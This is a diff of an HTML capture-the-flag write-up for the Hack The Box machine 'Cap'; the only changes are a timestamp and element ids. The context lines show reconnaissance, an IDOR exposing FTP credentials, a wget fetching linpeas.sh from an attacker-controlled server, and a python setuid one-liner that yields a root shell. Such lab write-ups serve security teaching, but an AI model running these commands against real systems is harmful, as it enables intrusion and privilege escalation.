@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2021-10-10 Sun 16:49 -->
+<!-- 2021-10-11 Mon 13:25 -->
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>HTB | CAP</title>
@@ -98,7 +98,7 @@ I'll start by running an nmap scan, which shows a webserver running that I will 
 <p>
 Below is the result from the <code>nmap</code> scan.
 </p>
-<pre class="example" id="org6c73b1d">
+<pre class="example" id="org7e7d90a">
 # Nmap 7.92 scan initiated Fri Oct  1 21:44:13 2021 as: nmap -sV -sC -O -oA nmap 10.129.231.0
 Nmap scan report for 10.129.231.0
 Host is up (0.051s latency).
@@ -251,7 +251,7 @@ Let's first start by running <code>gobuster</code>.
 <p>
 For the dir scan, I used the <code>raft-small-words.txt</code> wordlists found in SecLists.
 </p>
-<pre class="example" id="org35215b3">
+<pre class="example" id="orgcb309d3">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/cap ]
 └─&gt; $ gobuster dir -u "http://cap.htb" -w $REPOS/SecLists/Discovery/Web-Content/raft-small-words.txt             21:52
 ===============================================================
@@ -288,7 +288,7 @@ This didn't really give that much, so let us browse around the site manually.
 The index page on this box is a dashboard, showing some statistics around security related events on the network.
 </p>
 
-<figure id="orgacf87ef">
+<figure id="orga18e937">
 <img src="assets/2021-10-04_20-44-20_screenshot.png" alt="2021-10-04_20-44-20_screenshot.png">
 
 <figcaption><span class="figure-number">Figure 1: </span>Frontpage is a dashboard</figcaption>
@@ -312,7 +312,7 @@ On the left there is a menu linking to three other sites:
 There isn't anything anything really interesting, there is the possibility of an internal ip leak.
 So it's worth taking note off.
 </p>
-<pre class="example" id="orgd2e284d">
+<pre class="example" id="orgd0c095f">
 eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
         inet 10.129.231.0  netmask 255.255.0.0  broadcast 10.129.255.255
         inet6 fe80::250:56ff:feb9:ed52  prefixlen 64  scopeid 0x20&lt;link&gt;
@@ -340,7 +340,7 @@ lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
 <p>
 Again not really anything major here, not something you would want out there open for everyone, but there isn't anything we can exploit from it.
 </p>
-<pre class="example" id="org768bff4">
+<pre class="example" id="org67ec11b">
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
 tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1001       34771      -                    off (0.00/0/0)
@@ -483,7 +483,7 @@ Let's try and see if we can find captures which might contain interesting data.
 This btw is called an IDOR, or insecure direct object reference.
 </p>
 
-<figure id="org6d04546">
+<figure id="orgfd48af7">
 <img src="assets/2021-10-04_21-13-13_screenshot.png" alt="2021-10-04_21-13-13_screenshot.png">
 
 <figcaption><span class="figure-number">Figure 2: </span>Capture nr. 0</figcaption>
@@ -511,7 +511,7 @@ The pcap file retreived from the IDOR contains a fair amount of packets, to look
 Scrolling down shows an FTP stream, instead of looking at each packet individuallly, right click the stream, choose follow then TCP stream.
 Which gives the following exchange:
 </p>
-<pre class="example" id="org26afc06">
+<pre class="example" id="orgdca11dc">
 220 (vsFTPd 3.0.3)
 USER nathan
 331 Please specify the password.
@@ -556,7 +556,7 @@ Now that we have a user let's connect to the machine and get user flag!
 <p>
 Let's connect with <code>ssh</code>:
 </p>
-<pre class="example" id="org845e7e6">
+<pre class="example" id="org4caf649">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/cap ]
 └─&gt; $ ssh nathan@10.129.233.146                                                                                                                                                         21:33
 nathan@10.129.233.146's password: 
@@ -594,7 +594,7 @@ nathan@cap:~$
 <p>
 And read the flag:
 </p>
-<pre class="example" id="org22c138e">
+<pre class="example" id="org9e98390">
 nathan@cap:~$ ls
 user.txt
 nathan@cap:~$ cat user.txt 
@@ -619,7 +619,7 @@ python -m http.server
 <p>
 Then on the box I used <code>wget</code> to download it:
 </p>
-<pre class="example" id="org6e91641">
+<pre class="example" id="org70f1056">
 nathan@cap:/dev/shm$ wget http://10.10.17.47:8000/linpeas.sh
 --2021-10-04 19:41:54--  http://10.10.17.47:8000/linpeas.sh
 Connecting to 10.10.17.47:8000... connected.
@@ -635,7 +635,7 @@ linpeas.sh                                      100%[===========================
 <p>
 You can see a snippet results of <code>linpeas.sh</code> below:
 </p>
-<pre class="example" id="org907773c">
+<pre class="example" id="org39e5ca4">
 [+] Capabilities
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
 Current capabilities:
@@ -665,7 +665,7 @@ Files with capabilities:
 <p>
 If you look closely, you'll see that python has setuid capabilities, which we can use to gain root access with the following command:
 </p>
-<pre class="example" id="org1b7ee12">
+<pre class="example" id="orgb537a7f">
 nathan@cap:~$ python3.8 -xc "import os; os.setuid(0); os.system('/bin/bash')"
 root@cap:~#
 </pre>
@@ -676,7 +676,7 @@ root@cap:~#
 <p>
 Now all we need to do is read the flag:
 </p>
-<pre class="example" id="org296ec6e">
+<pre class="example" id="org49b4bb2">
 root@cap:~# cd /root/
 root@cap:/root# ls
 root.txt  snap
